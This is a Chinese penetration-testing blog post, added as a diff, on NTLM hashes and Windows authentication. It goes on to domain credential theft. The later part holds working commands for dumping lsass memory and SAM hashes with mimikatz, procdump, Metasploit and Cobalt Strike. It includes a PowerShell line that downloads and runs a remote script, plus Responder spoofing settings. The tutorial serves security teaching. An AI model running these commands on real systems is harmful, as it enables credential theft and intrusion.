@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Whatever is worth doing is worth doing well !">
+    <meta name="author" content="ssooking">
+    
+    <title>
+        
+            域渗透之NTML |
+        
+        ssooking&#39;s notebook
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                ssooking&#39;s notebook
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">域渗透之NTML</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">ssooking</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2018-12-03 09:25:00</span>
+        <span class="mobile">2018-12-03 09:25</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/NTML-Hash/">NTML-Hash</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="一、认识Windows-HASH"><a href="#一、认识Windows-HASH" class="headerlink" title="一、认识Windows HASH"></a>一、认识Windows HASH</h1><p>​    早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge&#x2F;Response”验证机制，简称LM，它非常简单很容易被破解，现在已经废弃。微软提出了Windows NT挑战&#x2F;响应验证机制，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为hash（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM hash，第二部分是NTLM hash。</p>
+<h2 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM HASH"></a>LM HASH</h2><p>​    <code>LM HASH</code>是一种较古老的Hash，在<code>LAN Manager</code>协议中使用，非常容易通过暴力破解获取明文凭据。Vista以前的Windows OS使用它，Vista之后的版本默认禁用了LM协议，但某些情况下还是可以使用。</p>
+<p><strong>补充：</strong></p>
+<p><code>Windows Vista</code>和<code>Windows Server 2008</code>以前的系统还会使用LM hash。LM hash的生成方法本文暂不介绍。自Vista和2008开始，Windows取消LM hash，但某些工具的参数需要填写固定格式<code>LM hash:NT hash</code>，可以将LM Hash填0(LM hash可以为任意值)，即<code>00000000000000000000000000000000:NT hash</code></p>
+<h2 id="NTLM-HASH"><a href="#NTLM-HASH" class="headerlink" title="NTLM HASH"></a>NTLM HASH</h2><p>​    <code>NTLM Hash（NT LAN Manager）</code>是支持<code>Net NTLM</code>认证协议及<code>本地认证</code>过程中的一个重要参数。其长度为32位，由数字与字母组成。它的前身是<code>LM Hash</code>，目前基本淘汰，两者相差不大，只是使用的加密算法不同。</p>
+<p><strong>本地认证</strong>：Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在<code>SAM (Security Account Manager Database，安全账号管理数据库)</code>中。SAM文件的路径是<code>%SystemRoot%\system32\config\sam</code>。在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成NTLM Hash，与SAM数据库中的NTLM Hash进行比较，从而实现认证。</p>
+<blockquote>
+<p>Note：在域环境下，DC (Domain Controller，域控制器)中也存在这样的数据库<code>AD (Account Database)</code>，位于<code>ntds.dit</code>文件。该文件包含用户对象、组和组成员身份信息、域中所有用户的密码哈希。</p>
+</blockquote>
+<p>NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。通常意义上的<code>NTLM Hash</code>指存储在<code>SAM</code>数据库及<code>NTDS数据库</code>中对密码进行Hash摘要计算后的结果，这类Hash可以直接用于PTH，并且通常存在于<code>LSASS</code>进程中，便于SSP使用。</p>
+<p>本地认证流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure>
+
+<p>首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对比SAM数据库中的hash进行验证。</p>
+<ul>
+<li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li>
+<li>LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。</li>
+</ul>
+<p>在系统中，hash格式是类似这样的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssooking:1001:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::</span><br><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::</span><br></pre></td></tr></table></figure>
+
+<h2 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM-Hash的生成"></a>NTLM-Hash的生成</h2><p>用户密码为<code>test123</code></p>
+<p>转换成十六进制的格式为<code>74657374313233</code></p>
+<p>转换成Unicode格式为<code>7400650073007400310032003300</code></p>
+<p>对字符串<code>7400650073007400310032003300</code>以十六进制格式作MD4加密，结果为<code>c5a237b7e9d8e708d8436b6148a25fa1</code></p>
+<p><strong>注：</strong></p>
+<p>MD4加密可使用工具HashCalc，如下图</p>
+<p>IBM设计的LM Hash算法存在几个弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，NTLM Hash便应运而生。假设明文口令是<code>123456</code>，首先转换成<code>Unicode</code>字符串，与LM Hash算法不同，这次不需要添加0补足14字节</p>
+<p><code>123456</code> -&gt; <code>310032003300340035003600</code>。</p>
+<blockquote>
+<p>从<code>ASCII</code>串转换成Unicode串时，使用<code>little-endian(小端)</code>序。0x80之前的标准ASCII码转换成Unicode码，就是简单地从0x??变成 0×00??。此类标准ASCII串按little-endian序转换成Unicode串，就是简单地在原有每个字节之后添加0×00。</p>
+</blockquote>
+<p>对所获取的 Unicode串进行标准MD4单向哈希，无论数据源有多少字节，MD4固定产生128-bit的哈希值，</p>
+<p>16字节 <code>310032003300340035003600</code>- 进行标准MD4单向哈希 -&gt; <code>32ED87BDB5FDC5E9CBA88547376818D4</code>，</p>
+<p>就得到了最后的NTLM Hash：<code>32ED87BDB5FDC5E9CBA88547376818D4</code></p>
+<p>实验环境下，测试服务器可以先关闭密码复杂性策略，设置一个简单的密码。</p>
+<blockquote>
+<p>gpedit.msc – 本地组策略编辑器 – 计算机配置 - windows设置 - 安全设置 - 帐户策略 - 密码策略</p>
+</blockquote>
+<p>后文以Adminstrator NTML Hash 为例。明文密码为<code>toor</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="二、NTML网络认证机制"><a href="#二、NTML网络认证机制" class="headerlink" title="二、NTML网络认证机制"></a>二、NTML网络认证机制</h1><h2 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h2><p>​    NTLM是除<code>Kerberos</code>之外的一种网络认证协议，只支持Windows。它是一种基于质询&#x2F;应答 (Challenge&#x2F;Response)消息交换模式的认证机制， 常用于<u>工作组</u>和<u>域环境</u>下<code>登录场景的身份认证</code>。</p>
+<h2 id="基于NTML协议的身份认证机制"><a href="#基于NTML协议的身份认证机制" class="headerlink" title="基于NTML协议的身份认证机制"></a>基于NTML协议的身份认证机制</h2><p>​    NTML网络认证采用质询&#x2F;应答 (Challenge&#x2F;Response) 模式进行数据交换，通过传输加密的<code>Challenge/Response</code>值并进行对比，从而验证用户身份。NTML网络认证会使用用户密码的Hash作为密钥，来加密<code>Challenge</code>，用户只有在输对密码的情况下，才能够同样利用密码的hash进行解密。这样通过对比两端的计算结果来判断凭据是否有效，从而实现身份认证。这样的好处是，用户的密码不会在网络链路中传输，加密之后的Challenge值取代原本密码的作用进行对比验证，与传统传输密码的方式相比，具有较高的安全性。</p>
+<p>通过交互过程中维护的<code>凭证（credential）</code>，包括域名、用户名、用户密码的hash串</p>
+<blockquote>
+<p>ps：域名信息会自动在数据包中携带，无需用户手动输入。</p>
+</blockquote>
+<p><strong>NTLM的认证过程</strong>分为三步：协商、质询、验证：</p>
+<ul>
+<li><strong>协商</strong>：主要用于确认双方协议版本</li>
+<li><strong>质询</strong>：质询&#x2F;应答 (Challenge&#x2F;Response) 模式，用于消息交换</li>
+<li><strong>验证</strong>：验证身份合法性，通常由Server端或域控制器完成这个过程</li>
+</ul>
+<p><strong>NTML的认证方式</strong>分为<code>Interactive（交互式）</code>和<code>Noninteractive（非交互式）</code>：</p>
+<p><code>交互式验证</code>：交互式提供必要凭据，通常应用场景通常为登录，即用户要登录某台客户端。</p>
+<p><code>非交互式验证</code>：无需交互式提供凭据，在实际应用中，比如命令行直接指定用户名、密码的方式登录，再比如我们在客户端上使用<code>net use</code>命令去映射服务器上某个共享文件夹的方式，这些便属于属于非交互式认证。但非交互式认证的应用场景更多的是<u><strong>已登录某客户端的用户去请求另一台服务器的资源</strong></u> ，或者为单点登录（SSO）的方式，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \\17.10.0.10\$share /u:administrator password</span><br></pre></td></tr></table></figure>
+
+
+
+<p>NTML认证机制在<code>工作组</code>环境下和在<code>域环境</code>下是不同的。</p>
+<p>​    <strong>工作组</strong>和<strong>域</strong>宏观上都是一群计算机的集合，域中计算机的数量规模通常大于工作组内的计算机。在认证体系中，工作组和域的主要区别在于，工作组内的机器名义上虽然是属于一个集合，但是内部各计算机还是各自管理各自的，没有一个相对成熟的信任机制，工作组内各个计算机的关系依旧是<code>点对点</code>的。因此，在工作组环境下进行访问认证，仅涉及<strong>Client</strong>和<strong>Server</strong>。我们使用的个人计算机，默认便处于WORKGROUP工作组环境下。</p>
+<p>​    域是一个有安全边界的计算机集合，同一个域中的计算机通过<code>共同的第三方信任机构</code>建立信任关系，这个第三方信任机构角色由<code>DC (Domain Controller，域控制器)</code> 担当。通俗来讲，域中的机器都信任域控制器，那么只要域控制器信任我们，我们就可以在域内获得对其他服务器的访问权限。在这种认证体系中涉及三方：<strong>Client、Server、DC</strong> 。</p>
+<blockquote>
+<p>注意：在Windows域环境下涉及三方的<strong>访问认证</strong>场景中，即客户端想要访问服务器资源的情况下，采用 <strong>基于Kerberos协议的网络认证机制</strong>，<u>NTML认证机制参与认证过程</u>。此部分详细内容请参考<a href="">域渗透之Kerberos</a> 。</p>
+</blockquote>
+<p>​    下面我们就来分别介绍一下在工作组和域环境下，基于NTML协议的网络认证机制的工作流程。以交互式为例。</p>
+<h2 id="工作组环境NTML认证流程"><a href="#工作组环境NTML认证流程" class="headerlink" title="工作组环境NTML认证流程"></a>工作组环境NTML认证流程</h2><p>工作组中，涉及Clinet、Server，流程如下：</p>
+<ul>
+<li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li>
+<li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
+<li>服务器生成一个16字节的随机数，称为<strong><em>质询</em> (challenge)</strong> 或<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx"><em>随机数 (nonce)</em></a>，并将<em>challenge</em>发送给客户端</li>
+<li>客户端使用缓存的<em><strong>用户密码的哈希值</strong></em>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器。</li>
+<li>服务器使用username从SAM帐户数据库中检索用户密码的hash，使用该hash来加密challenge，并与客户端计算的响应值进行比较。如果它们相同，则验证成功。</li>
+</ul>
+<h2 id="域环境NTML认证流程"><a href="#域环境NTML认证流程" class="headerlink" title="域环境NTML认证流程"></a>域环境NTML认证流程</h2><p>在域环境下多了域控制器的角色，微软给出的说明是这样的：</p>
+<blockquote>
+<ol>
+<li>(Interactive  authentication only) A user accesses a client computer and provides a  domain name, user name, and password. The client computes a  cryptographic <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms721586(v=VS.85).aspx"><em>hash</em></a> of the password and discards the actual password.</li>
+<li>The client sends the user name to the server (in <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms721603(v=VS.85).aspx"><em>plaintext</em></a>).</li>
+<li>The server generates a 16-byte random number, called a <em>challenge</em> or <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx"><em>nonce</em></a>, and sends it to the client.</li>
+<li>The client encrypts this challenge with the hash of the user’s  password and returns the result to the server. This is called the <em>response</em>.</li>
+<li>The server sends the following three items to the domain controller:<ul>
+<li>User name</li>
+<li>Challenge sent to the client</li>
+<li>Response received from the client</li>
+</ul>
+</li>
+<li>The domain controller uses the user name to retrieve the hash of  the user’s password from the Security Account Manager database. It uses  this password hash to encrypt the challenge.</li>
+<li>The domain controller compares the  encrypted challenge it computed (in step 6) to the response computed by  the client (in step 4). If they are identical, authentication is  successful.</li>
+</ol>
+</blockquote>
+<p>翻译过来流程大致如下：</p>
+<ol>
+<li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li>
+<li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
+<li>服务器生成一个16字节的随机数，称为<strong><em>质询</em> (challenge)</strong> 或<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx"><em>随机数 (nonce)</em></a>，并将<em>challenge</em>发送给客户端</li>
+<li>客户端使用缓存的<em><strong>用户密码的哈希值</strong></em>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器</li>
+<li>服务器将<em><strong>Username、Challenge、Response</strong></em><code>（Net-NTML hash）</code>发送给<em><strong>DC (Domain Controller，域控制器)</strong></em></li>
+<li>DC域控制器从<em><strong>AD (Account Database，帐户数据库)</strong></em> 中检索该用户名，并提取用户密码的NTML hash，使用该hash来加密challenge，并且把这个值和客户端计算的响应值进行比较。如果它们相同，则验证成功。</li>
+</ol>
+<h1 id="三、如何拿到Hash"><a href="#三、如何拿到Hash" class="headerlink" title="三、如何拿到Hash?"></a>三、如何拿到Hash?</h1><h2 id="1-本地获取"><a href="#1-本地获取" class="headerlink" title="1.本地获取"></a>1.本地获取</h2><p>在渗透测试中，通常可从Windows系统中的<code>SAM</code>文件和域控的<code>NTDS.dit</code>文件中获得用户hash，通过读取<code>lsass.exe</code>进程能获得已登录用户的NTLM hash。许多工具能够方便地为我们完成这些工作。但需要注意的是<strong>大部分抓取hash的工具都需要管理员权限</strong>。</p>
+<p>常用工具：</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&can=2&q=" >QuarksPwDump<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases" >Mimikatz<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" >ProDump<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" >Metasploit<i class="fas fa-external-link-alt"></i></a></li>
+<li>Cobaltstrike</li>
+</ul>
+<h3 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a><a class="link"   target="_blank" rel="noopener" href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&can=2&q=" >QuarksPwDump<i class="fas fa-external-link-alt"></i></a></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quarkspwdump.exe -dhl</span><br></pre></td></tr></table></figure>
+
+<h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><a class="link"   target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases" >Mimikatz<i class="fas fa-external-link-alt"></i></a></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>更方便的mimikatz命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords full&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行以下命令除了回显，还可以dump结果并将hash保存为log日志文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="built_in">log</span> <span class="string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ProDump"><a href="#ProDump" class="headerlink" title="ProDump"></a><a class="link"   target="_blank" rel="noopener" href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" >ProDump<i class="fas fa-external-link-alt"></i></a></h3><p><code>prodump</code>是微软提供的一个命令行实用程序，用于监视应用程序并生成故障转储。我们可以用它先dump对方主机的<code>LSASS</code>内存文件，然后在自己主机用<code>mimikatz</code>等工具进行处理。这种方式的好处是可以避免被查杀。先转储<code>LSASS</code>内存文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p>然后本地用<code>mimikatz</code>对<code>LSASS</code>内存文件进行破解：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>类似<code>ProDump</code>的工具还有：<strong>fgdump</strong>、<strong>pwdump</strong>、<strong>cachedump</strong>等。</p>
+<p>利用powershell也能够像<code>Prodump</code>一样转储lsass文件：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1&#x27;</span>); <span class="string">&quot;Get-Process lsass | Out-Minidump&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a class="link"   target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" >Metasploit<i class="fas fa-external-link-alt"></i></a></h3><p>首先需要获取<code>SYSTEM</code>权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
+
+<p>在<code>metasploit</code>中利用<code>mimikatz</code>获取hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure>
+
+<p><code>metasploit</code>提供的抓取hash的一些模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/hashdump</span><br><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
+
+<p><code>smart_hashdump</code>模块会把dump的hash文件保存在<code>/root/.msf4/loot</code>目录下，并且该模块一定程度上能够绕过<code>windows UAC</code>。</p>
+<p>顺便介绍一些能够直接获取明文密码的模块命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; wdigest （kerberos）</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords </span><br><span class="line"></span><br><span class="line">meterpreter&gt;load kiwi</span><br><span class="line">meterpreter&gt; creds_wdigest</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; getuid</span><br><span class="line">beacon&gt; powershell-import /root/powershell/Get-PassHashes.ps1</span><br><span class="line">beacon&gt; powershell Get-PassHashes</span><br></pre></td></tr></table></figure>
+
+
+
+<p> 读取hash，需要administer权限(右击目标主机–<code>Access</code>-<code>hashdump</code>)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; wdigest //读取信息</span><br><span class="line">beacon&gt; hashdump  </span><br></pre></td></tr></table></figure>
+
+<p>运行mimikatz(右击目标主机–<code>Access</code>- <code>RUN mimikatz</code>)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; logonpasswords </span><br></pre></td></tr></table></figure>
+
+<p>右击受害者主机–access-hashdump</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell-import /root/powershell/Inveigh/Inveigh.ps1</span><br><span class="line">beacon&gt; powershell Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -LLMNR Y -HTTP Y -PROXY Y</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-网络欺骗"><a href="#2-网络欺骗" class="headerlink" title="2.网络欺骗"></a>2.网络欺骗</h2><p>通常我们采用网络欺骗技术，配合受害者交互的方式窃取到是Net-NTLM Hash。这类hash并不能直接用于<code>pass-the-hash</code>攻击，但可以通过暴力破解的方式来获取明文密码。关于更多获取<code>Net-NTML HASH</code>的技巧，可以参考</p>
+<p>常用工具：</p>
+<ul>
+<li>Responder</li>
+<li>Metasploit</li>
+</ul>
+<h3 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h3><p><code>responder</code>可以伪造服务，对相关请求进行响应。开启命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure>
+
+<p>实战环境下，我们应该修改<code>/etc/responder/Responder.conf</code>配置文件，关闭其中的一些不必要的服务，从而减少网络流量，并产生针对性日志，如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; Servers to start</span><br><span class="line">SQL = Off</span><br><span class="line">SMB = On</span><br><span class="line">Kerberos = On</span><br><span class="line">FTP = Off</span><br><span class="line">POP = Off</span><br><span class="line">SMTP = Off</span><br><span class="line">IMAP = Off</span><br><span class="line">HTTP = On</span><br><span class="line">HTTPS = On</span><br><span class="line">DNS = On</span><br><span class="line">LDAP = On</span><br></pre></td></tr></table></figure>
+
+<p>针对测试而言，我们还可以设置<code>Challenge</code>值，以便观察流量格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Challenge = 1122334455667788</span><br></pre></td></tr></table></figure>
+
